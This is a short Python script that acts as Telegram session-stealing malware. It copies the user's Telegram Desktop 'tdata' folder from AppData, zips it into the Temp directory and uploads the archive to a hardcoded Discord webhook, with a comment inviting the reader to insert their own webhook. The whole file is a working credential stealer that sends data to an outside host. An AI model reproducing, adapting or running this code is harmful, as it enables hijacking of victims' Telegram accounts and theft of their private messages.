import os, os.path, shutil, requests
user = os.path.expanduser("~")

hook = "https://discord.com/api/webhooks/1093755454435377152/EKOp55VTcS9I7KR-PJl_y5xqY7II0nFQZhT2SdBOk_SbWkeFxV00G2hJPrMjNqjP2mQW" # U WEBHOOK HERE!

def telegram():
  if os.path.exists(user+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
   try:
    shutil.copytree(user+'\\AppData\\Roaming\\Telegram Desktop\\tdata', user+'\\AppData\\Local\\Temp\\tdata_session')
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\tdata_session', 'zip', user+'\\AppData\\Local\\Temp\\tdata_session')
   except:
    pass
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\tdata_session")
    except:
        pass
    with open(user+'\\AppData\\Local\\Temp\\tdata_session.zip', 'rb') as f:
     payload = {
        'file': (user+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
     }    
     r = requests.post(hook, files=payload)
# telegram()
